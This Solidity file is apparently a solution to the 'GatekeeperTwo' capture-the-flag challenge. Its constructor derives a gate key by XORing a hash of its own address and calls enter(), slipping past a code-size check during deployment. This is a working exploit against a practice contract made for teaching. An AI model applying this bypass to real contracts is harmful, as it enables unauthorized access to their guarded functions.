// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperTwo.sol";
import "hardhat/console.sol";

contract GatekeeperTwoCaller {
  GatekeeperTwo gatekeeperTwo;

  constructor(GatekeeperTwo _gatekeeperTwo) public {
    gatekeeperTwo = _gatekeeperTwo;

    /**Use XOR to create value from address(this).  Then that value can be checked against XOR to get back 0xffffffffffffffff, which is the max value for uint64. */
    bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0xffffffffffffffff));

    _gatekeeperTwo.enter(_gateKey);
  }

}